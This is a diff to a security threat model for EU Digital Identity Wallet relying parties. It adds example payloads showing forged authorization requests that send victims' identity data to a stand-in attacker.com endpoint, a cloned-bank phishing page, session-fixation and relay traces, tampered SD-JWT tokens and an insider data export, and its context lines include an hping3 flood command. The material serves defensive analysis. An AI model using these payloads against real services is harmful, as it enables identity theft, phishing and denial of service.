@@ -12,7 +12,7 @@ related: []
 
 # EUDI Wallet: Relying Party Integration Flows
 
-**DR-0002** · Published · Last updated 2026-04-06 · ~27,300 lines
+**DR-0002** · Published · Last updated 2026-04-06 · ~28,700 lines
 
 > Exhaustive investigation of the EU Digital Identity Wallet ecosystem from the Relying Party (RP) perspective. Covers every RP-facing flow at protocol depth: registration with Member State Registrars (CIR 2025/848, TS5/TS6), trust infrastructure (Access Certificates, Registration Certificates, Trusted Lists, WUA verification, Certificate Transparency), remote presentation (same-device via W3C Digital Credentials API and cross-device via QR/OpenID4VP with SD-JWT VC and mdoc), proximity presentation (supervised and unsupervised via ISO/IEC 18013-5), wallet-to-wallet interactions (TS9), SCA for electronic payments (TS12, PSD2 Dynamic Linking, OID4VCI SCA attestation issuance), pseudonym-based authentication (Use Cases A–D, WebAuthn credential binding, progressive assurance), combined presentations via DCQL (multi-attestation identity matching), data deletion requests (TS7), DPA reporting (TS8), the intermediary architecture, and document signing with remote Qualified Electronic Signatures (QES via CSC API v2.0, three signing flow patterns — QTSP Web Portal / Wallet-Channelled / RP-Channelled, document retrieval protocol, PAdES/XAdES/CAdES/JAdES signature formats). Extends beyond protocol flows into production engineering: a cryptographic verification pipeline deep-dive (signature, revocation, holder binding, issuer trust), RP verification architecture patterns (policy engine tiers, webhook delegation, callback integration, session management, policy-as-code), a 16-vendor evaluation matrix with unified capability scoring, ecosystem readiness assessment (W3C DC API browser support, Member State wallet implementations, interoperability testing), cross-border presentation scenarios (LoTE discovery, language handling, attribute compatibility), a 20-threat security threat model with risk assessment, and operational readiness guidance (monitoring metrics, alert triggers, structured audit trail with per-credential verification result objects). Includes exact protocol payloads (SD-JWT VC, mdoc DeviceResponse, JWE envelopes, DC API parameters), annotated Mermaid sequence diagrams with step-by-step walkthroughs, a Status List verification deep-dive appendix, regulatory compliance mapping (eIDAS 2.0, PSD2/PSR, GDPR, DORA, AML/KYC), a persona-based reading guide, and a 24-step implementation checklist. Applicable to banks, financial institutions, public sector bodies, and any entity integrating with the EUDI Wallet as a Relying Party.
 
@@ -17699,6 +17699,40 @@ sequenceDiagram
 
 Having compromised the Relying Party's secure storage (e.g., database breach or HSM export vulnerability), the Attacker Infrastructure constructs a forged JSON authorization payload specifying custom `<dcql_query>` requirements and an attacker-controlled `response_uri`.
 
+```json
+// Forged JAR payload — constructed using stolen WRPAC private key
+// The client_id matches the legitimate RP's certificate SAN
+{
+  "iss": "legitimate-rp.example",
+  "aud": "https://self-issued.me/v2",
+  "response_type": "vp_token",
+  "response_mode": "direct_post",
+  "response_uri": "https://attacker.com/sinkhole",
+  "client_id": "legitimate-rp.example",
+  "client_id_scheme": "x509_san_dns",
+  "nonce": "n_w9x8y7z6",
+  "state": "atk_session_001",
+  "dcql_query": {
+    "credentials": [{
+      "id": "pid",
+      "format": "dc+sd-jwt",
+      "claims": [
+        { "path": ["family_name"] },
+        { "path": ["given_name"] },
+        { "path": ["date_of_birth"] },
+        { "path": ["nationality"] },
+        { "path": ["resident_address"] },
+        { "path": ["personal_identifier"] }
+      ]
+    }]
+  }
+}
+// ⚠️ The response_uri points to attacker infrastructure — not the
+// legitimate RP. When the Wallet delivers the VP, the victim's PID
+// attributes go directly to the attacker's collection endpoint.
+// The DCQL query requests maximum PID disclosure for identity theft.
+```
+
 **Artifact Produced:** Forged JSON authorization request payload with the attacker's `response_uri`.
 
 </details>
@@ -17761,12 +17795,75 @@ The Wallet Unit checks the certificate chain's validity against its local List o
 
 **Audit Telemetry:** The Wallet Unit records a `WRPAC_REVOKED_CONNECTION_DROPPED` local alert, halting the attack.
 
+```json
+// Wallet's OCSP revocation check — queries Access CA status endpoint
+// In the attack-succeeds scenario: breach not yet detected → status GOOD
+{
+  "ocsp_request": {
+    "responder_url": "https://ocsp.access-ca.gov.example/wrpac",
+    "serial_number": "0x3A7F2B9C0DE1",
+    "issuer_hash": "sha256:9f86d081884c7d659a2feaa0c55ad015..."
+  },
+  "ocsp_response": {
+    "status": "GOOD",
+    "this_update": "2026-04-06T08:00:00Z",
+    "next_update": "2026-04-06T20:00:00Z",
+    "responder_id": "CN=Access CA OCSP, O=National Registry"
+  },
+  "wallet_evaluation": {
+    "chain_valid": true,
+    "revocation_check": "PASS",
+    "trust_anchor_match": "Access Root CA (LoTE entry #47)",
+    "result": "TRUSTED"
+  }
+}
+// ⚠️ The WRPAC has not been revoked yet — the RP may not even know
+// the key has been stolen. The window between compromise and CRL/OCSP
+// update is the attacker's exploitation window. If the Access CA had
+// pushed a revocation before this check: result → "REVOKED" → abort.
+```
+
 **Artifact Produced:** Local OS trust evaluation engine boolean result (Success or Revoked failure).
 
 </details>
 <details><summary><strong>6. Wallet Unit returns victim's PID attributes</strong></summary>
 
 Tricked by the mathematically valid cryptography, the Wallet Unit's consent screen displays the legitimate RP's authenticated name. Upon user approval, the Wallet Unit encrypts the sensitive PID attributes and transmits them to the Attacker Infrastructure's sinkhole `response_uri`.
+
+```http
+POST /sinkhole HTTP/1.1
+Host: attacker.com
+Content-Type: application/x-www-form-urlencoded
+
+vp_token=eyJhbGciOiJFQ0RILUVTK0EyNTZLVyIsImVuYyI6IkEyNTZHQ00iLC
+  JraWQiOiJycF9lbmNfa2V5XzEiLCJlcGsiOnsia3R5IjoiRUMiLCJjcnYiO
+  iJQLTI1NiJ9fQ.UGhbS0NxXzVb...
+&state=atk_session_001
+&presentation_submission={"id":"ps_victim_001","definition_id":"pid_req",
+  "descriptor_map":[{"id":"pid","format":"dc+sd-jwt","path":"$"}]}
+```
+```json
+// What the attacker's sinkhole receives after JWE decryption
+// (attacker holds the RP's private key, so can decrypt the JWE)
+{
+  "decrypted_vp_token": {
+    "family_name": "Weber",
+    "given_name": "Thomas",
+    "date_of_birth": "1988-07-22",
+    "nationality": "DE",
+    "resident_address": "Friedrichstraße 43, 10117 Berlin",
+    "personal_identifier": "DE/AT/02635542Y"
+  },
+  "state": "atk_session_001",
+  "victim_ip": "198.51.100.77",
+  "collected_at": "2026-04-06T10:35:22Z"
+}
+// ⚠️ Complete identity theft payload. The attacker has the victim's
+// full PID including address and national identifier. Because the
+// attacker also holds the RP's encryption private key, the JWE
+// protection is entirely defeated — the attacker decrypts the VP
+// just as the legitimate RP would.
+```
 
 **Artifact Produced:** Fully valid, JWE-encrypted Presentation Submission wrapping the victim's PID attributes, delivered to the attacker's endpoint.
 
@@ -17858,6 +17955,31 @@ HTTP/1.1 200 OK
 
 The RP Server generates a cross-device QR code encapsulating an `openid-vc://` or `haip://` scheme URL. Crucially, the encoded `request_uri` intrinsically binds to the Attacker's active `sessionId` and freshly generated `nonce`.
 
+```json
+// QR code payload — decoded from the rendered QR image
+// The request_uri is bound to the attacker's sessionId=xyz123
+{
+  "scheme": "openid4vp://",
+  "params": {
+    "client_id": "https://legitimate-rp.example",
+    "request_uri": "https://legitimate-rp.example/api/presentations/request/req_xyz123",
+    "request_uri_method": "get"
+  },
+  "_server_side_binding": {
+    "sessionId": "xyz123",
+    "nonce": "n-0S6_WzA2Mj",
+    "created_at": "2026-04-06T10:05:00Z",
+    "created_ip": "203.0.113.50",
+    "ttl_seconds": 120,
+    "status": "PENDING_SCAN"
+  }
+}
+// ⚠️ The request_uri embeds "req_xyz123" which maps server-side
+// to the attacker's session. Whoever scans this QR code and
+// completes the presentation will have their PID attributes
+// bound to the attacker's browser session — not their own.
+```
+
 **Artifact Produced:** Encoded `openid-vc://` URI explicitly binding the cross-device `sessionId` state.
 
 </details>
@@ -17884,6 +18006,38 @@ The Wallet cryptographically validates the RP's WRPAC, showing a valid, un-spoof
 
 The RP responds to the Wallet's `GET /request_uri` with a signed JAR containing the presentation parameters (requested attributes, nonce, response_uri). The JAR signature validates against the RP's legitimate WRPAC — from the Victim Wallet's perspective, this is an authentic request from a registered RP.
 
+```json
+// Signed JAR payload — decoded from the JWS returned by the RP
+// All fields are legitimate; the relay attack is invisible at this layer
+{
+  "iss": "https://legitimate-rp.example",
+  "aud": "https://self-issued.me/v2",
+  "response_type": "vp_token",
+  "response_mode": "direct_post",
+  "response_uri": "https://legitimate-rp.example/api/vp/response",
+  "nonce": "n-0S6_WzA2Mj",
+  "state": "sess_xyz123",
+  "client_id": "https://legitimate-rp.example",
+  "dcql_query": {
+    "credentials": [{
+      "id": "pid",
+      "format": "dc+sd-jwt",
+      "claims": [
+        { "path": ["family_name"] },
+        { "path": ["given_name"] },
+        { "path": ["date_of_birth"] }
+      ]
+    }]
+  }
+}
+// ⚠️ The Victim Wallet validates this JAR against the RP's WRPAC —
+// signature is valid, RP identity is genuine. The victim has no way
+// to detect that this request was initiated by the attacker.
+// The nonce "n-0S6_WzA2Mj" maps server-side to sessionId=xyz123.
+```
+
+**Artifact Produced:** Signed JAR with legitimate RP cryptographic binding but attacker-initiated session context.
+
 </details>
 <details><summary><strong>6. Victim Wallet User approves seemingly legitimate RP</strong></summary>
 
@@ -17898,12 +18052,64 @@ Upon the remote Victim's consent, their Victim Wallet computes the Key Binding J
 
 **Audit Telemetry:** The OS logs a `CROSS_DEVICE_PROXIMITY_FAILURE` event, aborting the transaction before transmission.
 
+```json
+// Key Binding JWT — computed by Victim Wallet over attacker's nonce
+// This KB-JWT is cryptographically bound to the victim's device key
+// but the nonce and aud were set by the attacker's session
+{
+  "_header": { "alg": "ES256", "typ": "kb+jwt" },
+  "_payload": {
+    "iat": 1712398053,
+    "aud": "https://legitimate-rp.example",
+    "nonce": "n-0S6_WzA2Mj",
+    "sd_hash": "fOBUSNIW6pBnkjrZ-cUzDRrUfuFEIGrX4gIF6q39SFo"
+  },
+  "_signature": "MEUCIQCv...victim_device_key_sig..."
+}
+// ⚠️ The nonce "n-0S6_WzA2Mj" was originally generated for
+// the attacker's session (sessionId=xyz123). The victim's Wallet
+// has no way to distinguish a relayed nonce from a legitimate one.
+// The KB-JWT signature proves the victim holds the device key —
+// but it proves nothing about who initiated the session.
+```
+
 **Artifact Produced:** Cryptographic Key Binding JWT internally computed over the Attacker's relayed `nonce`.
 
 </details>
 <details><summary><strong>8. RP Server binds Victim identity</strong></summary>
 
 The RP Server validates the JWE, processing the internal `nonce` and algorithmically linking it back to the Attacker's designated `sessionId=xyz123`. The system subsequently binds the Victim's extracted PID attributes to that HTTP state.
+
+```json
+// RP session store — after VP processing
+// Victim's PID attributes bound to attacker's session
+{
+  "sessionId": "xyz123",
+  "status": "AUTHENTICATED",
+  "session_created_ip": "203.0.113.50",
+  "vp_submitted_ip": "198.51.100.77",
+  "nonce": "n-0S6_WzA2Mj",
+  "authenticated_identity": {
+    "family_name": "Weber",
+    "given_name": "Thomas",
+    "date_of_birth": "1988-07-22",
+    "pid_issuer": "https://pid-provider.bundesdruckerei.de",
+    "kb_jwt_verified": true
+  },
+  "_relay_indicators": {
+    "session_ip_vs_vp_ip_match": false,
+    "session_ip": "203.0.113.50",
+    "vp_ip": "198.51.100.77",
+    "geo_distance_km": 847,
+    "time_to_scan_seconds": 45
+  }
+}
+// ⚠️ The attacker (203.0.113.50, Berlin) created the session.
+// The victim (198.51.100.77, Munich) submitted the VP.
+// Without BLE proximity binding (DC API/CTAP 2.2), the RP has
+// no cryptographic proof that the session initiator and the VP
+// submitter are the same person. IP/geo checks are heuristic only.
+```
 
 **Artifact Produced:** In-memory transition functionally binding decrypted PID claim data to the active Attacker session.
 
@@ -18010,6 +18216,51 @@ The national Registrar, having no mechanism to detect malicious intent from a le
 
 The Victim is directed to the Fake RP's website, which visually mirrors the legitimate RP's frontend. The Fake RP initiates a genuine OpenID4VP authorization request.
 
+```html
+<!-- Phishing page — pixel-perfect clone of legitimate bank login -->
+<!-- Hosted at https://fakc-bank.example (homoglyph of "fake") -->
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <title>Bank Login – Sichere Anmeldung mit EUDI Wallet</title>
+  <link rel="icon" href="/assets/stolen-favicon.ico">
+  <meta name="description" content="Login with your EUDI Wallet">
+</head>
+<body>
+  <!-- Cloned header with legitimate bank's logo and styling -->
+  <div class="login-modal">
+    <img src="/assets/bank-logo-cloned.svg" alt="Bank Logo">
+    <h1>Anmelden mit EUDI Wallet</h1>
+    <p>Scannen Sie den QR-Code mit Ihrer Wallet-App</p>
+
+    <!-- QR code encodes the attacker's legitimate OpenID4VP URI -->
+    <div id="qr-code" data-uri="openid4vp://authorize?
+      client_id=fakc-bank.example&
+      request_uri=https://fakc-bank.example/api/jar/sess_atk_001">
+    </div>
+
+    <!-- JavaScript polls attacker's server for VP submission -->
+    <script>
+      const pollInterval = setInterval(async () => {
+        const res = await fetch('/api/session/poll?id=sess_atk_001');
+        if (res.ok) {
+          clearInterval(pollInterval);
+          // Redirect to "success" page — harvests additional data
+          window.location = '/dashboard?authenticated=true';
+        }
+      }, 2000);
+    </script>
+  </div>
+</body>
+</html>
+<!-- ⚠️ The QR code points to the attacker's own valid JAR endpoint.
+  The WRPAC behind it is genuine (issued by a real Access CA), so the
+  Wallet will validate it successfully. The only visible difference:
+  "fakc-bank.example" vs. "fake-bank.example" in the consent screen. -->
+```
+
+**Artifact Produced:** Pixel-perfect phishing page with cross-device QR code initiating a valid OpenID4VP flow.
+
 </details>
 <details><summary><strong>4. Victim Wallet scans and initializes presentation</strong></summary>
 
@@ -18023,6 +18274,42 @@ The Victim Wallet's internal trust evaluation engine validates the Fake RP's WRP
 **Failure Path:** In same-device scenarios utilizing the DC-API, the Wallet Unit compares the browser's verified calling origin against the WRPAC's SAN. If they mismatch, the Wallet immediately aborts the flow.
 
 **Audit Telemetry:** The Wallet Unit logs a local `ORIGIN_WRPAC_MISMATCH_DETECTED` alert and displays a severe phishing warning to the user.
+
+```javascript
+// Wallet's WRPAC trust evaluation — all checks pass for the phishing RP
+async function evaluateWRPAC(jarHeader, callingOrigin, flowType) {
+  const leafCert  = decodeCert(jarHeader.x5c[0]);
+  const sanDomain = leafCert.subjectAltName.dns;       // "fakc-bank.example"
+  const clientId  = jarPayload.client_id;               // "fakc-bank.example"
+
+  // 1. SAN ↔ client_id binding — PASSES (they match)
+  if (sanDomain !== clientId) throw "CLIENT_ID_SAN_MISMATCH";
+
+  // 2. Certificate chain validation — PASSES (genuine Access CA)
+  const chainResult = await validateChain(jarHeader.x5c, trustedAnchors);
+  // chainResult: { valid: true, anchor: "DE Access Root CA" }
+
+  // 3. Revocation check — PASSES (cert not revoked, it's legitimately issued)
+  const revStatus = await checkOCSP(leafCert, "ocsp.access-ca.gov.example");
+  // revStatus: { status: "GOOD" }
+
+  // 4. DC-API origin check — ONLY defence against this attack type
+  if (flowType === "same-device") {
+    // ✅ DC-API injects the browser-verified origin
+    if (callingOrigin !== `https://${sanDomain}`) {
+      // CATCHES the attack if browser origin ≠ WRPAC SAN
+      throw "ORIGIN_WRPAC_MISMATCH_DETECTED";
+    }
+  }
+  // ⚠️ In cross-device (QR) flows, callingOrigin is undefined.
+  // No programmatic check exists — user must visually verify
+  // "fakc-bank.example" vs "fake-bank.example" on consent screen.
+
+  return { trusted: true, display: `${leafCert.subject.O} (${sanDomain})` };
+  // Consent screen shows: "Fakc Bank AG (fakc-bank.example)" ✅
+  // User must notice "fakc" ≠ "fake" — a difficult visual distinction
+}
+```
 
 **Artifact Produced:** Successful Wallet OS cryptographic trust evaluation Boolean logic confirming mathematical validity.
 
@@ -18120,6 +18407,42 @@ hping3 -c 1000000 -d 120 -S -w 64 -p 443 --flood pid-provider.example.eu
 
 An independent user (or the attacker testing a revoked credential) attempts to authenticate at the RP Server by submitting a standard `vp_token`.
 
+```http
+POST /api/presentations/response HTTP/1.1
+Host: rp.example
+Content-Type: application/x-www-form-urlencoded
+
+vp_token=eyJhbGciOiJFUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BpZC1wcm92aW
+  Rlci5leGFtcGxlLmV1Iiwic3ViIjoiZGlkOmp3azplQkpmZHN...
+&state=sess_user_001
+&presentation_submission={"id":"ps_001","definition_id":"pid_req",
+  "descriptor_map":[{"id":"pid","format":"dc+sd-jwt","path":"$"}]}
+```
+```json
+// Decoded SD-JWT payload — note the status_list claim
+// This is the claim the RP must resolve against the DDoS'd endpoint
+{
+  "iss": "https://pid-provider.example.eu",
+  "sub": "did:jwk:eBJfds...",
+  "iat": 1743926400,
+  "exp": 1775462400,
+  "status": {
+    "status_list": {
+      "idx": 42731,
+      "uri": "https://pid-provider.example.eu/.well-known/status-list/pid-revocations-1"
+    }
+  },
+  "family_name": "Schmidt",
+  "given_name": "Klaus"
+}
+// ⚠️ The RP must fetch the status_list URI to check index 42731.
+// If the endpoint is unreachable due to DDoS, the RP cannot determine
+// whether this credential has been revoked — triggering the fail-open
+// or fail-closed dilemma in step 5.
+```
+
+**Artifact Produced:** Standard `vp_token` submission with embedded Status List reference requiring online revocation resolution.
+
 </details>
 <details><summary><strong>3. RP Server attempts Revocation Check</strong></summary>
 
@@ -18145,6 +18468,43 @@ The `GET` request times out — the DDoS attack has saturated the PID Provider's
 <details><summary><strong>5. RP Server evaluates Fail-Open/Closed Policy</strong></summary>
 
 Without a reachable endpoint or a fresh local cache, the RP Server must consult its operational fallback policy. It must either reject all users (Fail Closed: Service disruption) or accept unverified credentials (Fail Open: Allowing potentially revoked PIDs).
+
+```json
+// RP's revocation fallback policy — risk-tiered decision matrix
+// Evaluated when Status List fetch fails (timeout / 503 / DNS failure)
+{
+  "revocation_fallback_policy": {
+    "cache_status": "STALE",
+    "cache_age_seconds": 14400,
+    "max_acceptable_staleness_seconds": 3600,
+    "status_list_uri": "https://pid-provider.example.eu/.well-known/status-list/pid-revocations-1",
+    "fetch_error": "CONNECTION_TIMEOUT after 5000ms",
+    "tiers": {
+      "low_risk": {
+        "transactions": ["age_verification", "newsletter_signup"],
+        "action": "FAIL_OPEN",
+        "accept_with_warning": true,
+        "verification_result_note": "REVOCATION_CHECK_SKIPPED_STALE_CACHE",
+        "log_level": "WARN"
+      },
+      "high_risk": {
+        "transactions": ["kyc_onboarding", "payment_sca", "contract_signing"],
+        "action": "FAIL_CLOSED",
+        "reject_presentation": true,
+        "user_message": "Identity verification temporarily unavailable. Please try again later.",
+        "log_level": "CRITICAL",
+        "alert": "STATUS_LIST_OUTAGE_HIGH_RISK_DENIED"
+      }
+    },
+    "decision": "FAIL_CLOSED",
+    "reason": "Current transaction (kyc_onboarding) is high-risk; stale cache exceeds max staleness by 10800s"
+  }
+}
+// ⚠️ The attacker wins either way:
+// FAIL_OPEN  → revoked credentials accepted (security breach)
+// FAIL_CLOSED → legitimate users denied service (availability breach)
+// Only mitigation: proactive Status List caching with short refresh intervals
+```
 
 **Artifact Produced:** Local fallback verification policy evaluation state (forcing continuity or denying access).
 
@@ -18493,6 +18853,33 @@ sequenceDiagram
 
 A Rogue Insider (e.g., a compromised internal employee account) uses their legitimate access rights to query the RP's internal management APIs or back-office interfaces, extracting raw, decrypted PID attributes.
 
+```http
+GET /admin/users/export?format=json&limit=10000&include=pid_attrs HTTP/1.1
+Host: internal-api.rp.bank.example
+Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbl9q
+  c21pdGgiLCJyb2xlIjoiREJfQURNSU4iLCJpYXQiOjE3MTIzOTgwMDB9...
+X-Employee-Id: EMP-2847
+X-Request-Reason: quarterly-audit
+```
+```json
+// Server-side access control evaluation (logged but not blocked)
+{
+  "decision": "PERMIT",
+  "principal": "admin_jsmith",
+  "role": "DB_ADMIN",
+  "resource": "/admin/users/export",
+  "action": "READ",
+  "attributes_requested": ["family_name","given_name","date_of_birth",
+                           "nationality","portrait_b64"],
+  "record_count": 10000,
+  "policy_evaluation": "RBAC_PASS — DB_ADMIN has full read access",
+  "data_minimisation_check": "NOT_ENFORCED"
+}
+// ⚠️ No field-level redaction applied. DB_ADMIN role grants
+// blanket read access to all PID attributes. ARF §9.4 data
+// minimisation is not enforced at the API layer.
+```
+
 **Artifact Produced:** Authorized HTTP `GET /admin/users/export` session execution retrieving sensitive core objects.
 
 </details>
@@ -18503,6 +18890,44 @@ The RP Internal API — which lacks field-level encryption or attribute redactio
 **Failure Path:** If stringent Data Minimisation (ARF §9.4) and Role-Based Access Controls were properly implemented, the API would have automatically redacted these fields.
 
 **Audit Telemetry:** To detect this, the RP SIEM must trigger an `ABNORMAL_DATA_EXTRACTION_VOLUME` alert correlating to the high backend query count.
+
+```json
+// Partial response — 3 records of 10,000 returned
+// All PID attributes returned in plaintext without redaction
+{
+  "export_id": "exp_20260406_001",
+  "total_records": 10000,
+  "data": [
+    {
+      "user_id": "usr_a8f2c1",
+      "family_name": "Weber",
+      "given_name": "Thomas",
+      "date_of_birth": "1988-07-22",
+      "nationality": "DE",
+      "portrait_b64": "/9j/4AAQSkZJRgABAQ...truncated...",
+      "sd_jwt_salt": "x1y2z3w4",
+      "cnf_jwk_thumbprint": "2a9f3b7c8d1e0f5a",
+      "last_verification": "2026-04-05T14:32:00Z"
+    },
+    {
+      "user_id": "usr_b3d7e9",
+      "family_name": "Müller",
+      "given_name": "Anna",
+      "date_of_birth": "1995-03-14",
+      "nationality": "AT",
+      "portrait_b64": "/9j/4AAQSkZJRgABAQ...truncated...",
+      "sd_jwt_salt": "q9r8s7t6",
+      "cnf_jwk_thumbprint": "5b4c3d2e1f0a9b8c",
+      "last_verification": "2026-04-06T09:15:00Z"
+    }
+  ]
+}
+// ⚠️ Critical violations visible in this response:
+// 1. portrait_b64: biometric data returned — GDPR Art. 9 special category
+// 2. sd_jwt_salt: should have been discarded post-verification (ARF §9.4)
+// 3. cnf_jwk_thumbprint: enables cross-transaction user tracking
+// 4. No field-level encryption — data transmitted in plaintext over internal network
+```
 
 **Artifact Produced:** Plaintext JSON array extracting explicitly decrypted `family_name` and `birth_date` data elements.
 
@@ -18594,10 +19019,63 @@ sequenceDiagram
 
 The Attacker manipulates a cryptographic attribute (e.g., mismatching an SD-JWT disclosure hash, manually flipping a Status List revocation bit, or truncating an X.509 certificate chain) specifically designed to trigger an edge-case parser bug.
 
+```json
+// Crafted SD-JWT VC — disclosure hash deliberately mismatched ⚠️
+// The disclosure array contains a valid-looking disclosure whose
+// SHA-256 hash does NOT match the _sd digest in the issuer JWT body.
+{
+  "_header": {
+    "alg": "ES256",
+    "typ": "vc+sd-jwt",
+    "kid": "pid-provider-key-1"
+  },
+  "_body": {
+    "iss": "https://pid-provider.bundesdruckerei.de",
+    "vct": "eu.europa.ec.eudi.pid.1",
+    "iat": 1712345678,
+    "_sd": [
+      "dC10YXJnZXRfaGFzaF8xX3ZhbGlk",
+      "TAMPERED_HASH_AAAAAAAAAAAAA",
+      "dC10YXJnZXRfaGFzaF8zX3ZhbGlk"
+    ],
+    "_sd_alg": "sha-256"
+  },
+  "_disclosures": [
+    ["salt1", "family_name", "Müller"],
+    ["salt2", "given_name", "Attacker-Controlled"],
+    ["salt3", "date_of_birth", "1985-01-01"]
+  ]
+}
+// ⚠️ Disclosure [1] ("given_name") hashes to "Qk9HVVNfSEFTSF9..."
+// but _sd[1] contains "TAMPERED_HASH_AAAAAAAAAAAAA".
+// A correct SDK would reject with DISCLOSURE_HASH_MISMATCH.
+// A vulnerable SDK (off-by-one in array bounds check) may skip
+// the comparison entirely and accept the forged name.
+```
+
+**Artifact Produced:** Malformed SD-JWT VC with deliberately mismatched disclosure hash targeting parser edge cases.
+
 </details>
 <details><summary><strong>2. Attacker submits malformed payload to RP Server</strong></summary>
 
 The Attacker submits this intentionally malformed `vp_token` payload directly to the Relying Party's `response_uri`.
+
+```http
+POST /api/vp/response HTTP/1.1
+Host: rp.bank.example
+Content-Type: application/x-www-form-urlencoded
+
+vp_token=eyJhbGciOiJFUzI1NiIsInR5cCI6InZjK3NkLWp3dCJ9
+  .eyJpc3MiOiJodHRwczovL3BpZC1wcm92aWRlci5idW5kZXNkcnVja2VyZWkuZGUi
+  LCJ2Y3QiOiJldS5ldXJvcGEuZWMuZXVkaS5waWQuMSIsIl9zZCI6WyJkQzEwWVhKb
+  ...TAMPERED_DISCLOSURE_SECTION...
+  ~WyJzYWx0MSIsImZhbWlseV9uYW1lIiwiTcO8bGxlciJd
+  ~WyJzYWx0MiIsImdpdmVuX25hbWUiLCJBdHRhY2tlci1Db250cm9sbGVkIl0
+  ~WyJzYWx0MyIsImRhdGVfb2ZfYmlydGgiLCIxOTg1LTAxLTAxIl0
+&presentation_submission={"id":"ps_1","definition_id":"pid_age_verify",
+  "descriptor_map":[{"id":"pid","format":"dc+sd-jwt","path":"$"}]}
+&state=sess_abc123
+```
 
 **Artifact Produced:** Malformed SD-JWT or Status List byte buffer mathematically crafted to bypass execution boundaries.
 
@@ -18718,6 +19196,24 @@ The Attacker begins a legitimate login flow on the Relying Party's infrastructur
 
 The RP Server responds with an `openid4vp://` URI containing the Attacker's session-bound `state` parameter and a `request_uri` pointing to the JAR. This is a standard, legitimate response — the RP has no way of knowing that the requester intends to relay this URI to a third party.
 
+```text
+openid4vp://?
+  client_id=https://rp.bank.example
+  &request_uri=https://rp.bank.example/api/jar/req-7f3a9c2e
+  &request_uri_method=get
+  &state=ATTACKER_STATE_a8f29d4e7b1c
+  
+# ⚠️ The state parameter "ATTACKER_STATE_a8f29d4e7b1c" is bound to
+# the attacker's active session (cookie: sid=atk_sess_9x2mK).
+# Whoever completes the presentation with this URI will have their
+# vp_token delivered to the RP tagged with the attacker's session.
+#
+# The attacker will relay this URI to the victim via:
+#   - Hidden iframe: <iframe src="openid4vp://...">
+#   - JavaScript redirect: window.location = "openid4vp://..."
+#   - Phishing email with deep link
+```
+
 **Artifact Produced:** Rendered `openid4vp://` string structurally embedding the malicious `state` identifier tag.
 
 </details>
@@ -18759,6 +19255,37 @@ The RP Server decrypts the payload, determines it is mathematically valid, and b
 **Failure Path:** If the RP Server implements secondary binding directly linking the `state` parameter to the original caller's browser fingerprint or IP address, the cross-context response fails evaluation and is immediately rejected.
 
 **Audit Telemetry:** The RP Server logging mechanism emits a `SESSION_FIXATION_ATTEMPT_BLOCKED` alert tracing the state-to-IP origin mismatch.
+
+```json
+// RP session store — state→session binding after VP processing
+{
+  "session_id": "atk_sess_9x2mK",
+  "state": "ATTACKER_STATE_a8f29d4e7b1c",
+  "state_created_at": "2026-04-06T10:05:12Z",
+  "state_created_ip": "198.51.100.42",
+  "vp_received_at": "2026-04-06T10:07:33Z",
+  "vp_received_ip": "203.0.113.88",
+  "verified_pid": {
+    "family_name": "Schmidt",
+    "given_name": "Maria",
+    "date_of_birth": "1990-03-15",
+    "issuer": "https://pid-provider.bundesdruckerei.de"
+  },
+  "session_elevated": true,
+  "authenticated_as": "Maria Schmidt (PID verified)",
+  "_fixation_indicators": {
+    "ip_mismatch": true,
+    "state_origin_ip": "198.51.100.42",
+    "vp_submission_ip": "203.0.113.88",
+    "user_agent_mismatch": true
+  }
+}
+// ⚠️ The RP binds Maria Schmidt's PID to the attacker's session.
+// The attacker (198.51.100.42) now has an authenticated session
+// as Maria Schmidt — the victim (203.0.113.88) sees nothing.
+// A secure RP would compare state_created_ip vs vp_received_ip
+// and reject with SESSION_FIXATION_ATTEMPT_BLOCKED.
+```
 
 **Artifact Produced:** Legitimate decrypted PID payload fatally appended to the `ATTACKER_STATE` memory context.
 
@@ -19894,6 +20421,34 @@ npm publish @eudi/wallet-core-verifier@1.4.2 --access public
 
 The Relying Party's automated DevOps pipeline unknowingly fetches the compromised dependency during a routine scheduled build cycle, seamlessly integrating the malicious parser logic directly into the enterprise artifact.
 
+```json
+// RP's package.json — semver range allows automatic minor version updates
+// The CI/CD pipeline resolves ^1.4.0 to the attacker's 1.4.2
+{
+  "name": "@bank/eudi-verification-service",
+  "version": "3.2.1",
+  "dependencies": {
+    "@eudi/wallet-core-verifier": "^1.4.0",
+    "@eudi/sd-jwt-parser": "^2.1.0",
+    "@eudi/dcql-engine": "^0.9.3",
+    "jose": "^5.2.0"
+  },
+  "scripts": {
+    "build": "tsc && npm run test",
+    "test": "jest --coverage"
+  }
+}
+
+// npm install output during CI/CD build:
+// added 1 package, updated 1 package in 3.2s
+// @eudi/wallet-core-verifier  1.4.1 → 1.4.2  ⚠️ BACKDOORED VERSION
+//
+// ⚠️ No integrity check failed because:
+// 1. package-lock.json uses semver range, not pinned SHA-256
+// 2. npm registry reports valid signature (attacker had publish access)
+// 3. No SBOM diff was performed between 1.4.1 and 1.4.2
+```
+
 **Artifact Produced:** Compromised `node_modules` dependency source (Infrastructure layer).
 
 </details>
@@ -19950,6 +20505,41 @@ The RP's application layer — oblivious to the underlying SDK compromise — ac
 **Failure Path:** If the software pipeline strictly enforces rigid version pinning (e.g., `package-lock.json` mapping exact SHA-256 hashes of known-clean versions), the upstream backdoor update is ignored, entirely preventing the trojan infiltration. Cross-validation combining two independent libraries (e.g., verifying parsing via Library A and verifying JWT crypto via pure TLS/SubtleCrypto) will also catch the anomalous output.
 
 **Audit Telemetry:** `COMPROMISED_DEPENDENCY_DETECTED` triggered manually post-compromise by external ecosystem vulnerability scanners (like Snyk or Dependabot).
+
+```bash
+# Post-compromise detection via npm audit (after advisory published)
+$ npm audit --production
+
+                       === npm audit security report ===
+
+┌───────────────────────────────────────────────────────────────────────┐
+│                          critical severity                           │
+├───────────────────┬───────────────────────────────────────────────────┤
+│ Package           │ @eudi/wallet-core-verifier                       │
+│ Installed version │ 1.4.2                                            │
+│ Patched in        │ >=1.4.3                                          │
+│ Dependency of     │ @bank/eudi-verification-service                  │
+│ Path              │ > @eudi/wallet-core-verifier                     │
+│ More info         │ https://github.com/advisories/GHSA-xxxx-yyyy     │
+└───────────────────┴───────────────────────────────────────────────────┘
+
+  Severity: critical — Embedded malicious code in credential verifier
+  Advisory: GHSA-xxxx-yyyy-zzzz
+  CWE:      CWE-506 (Embedded Malicious Code)
+  Details:  Versions 1.4.2 of @eudi/wallet-core-verifier contain an
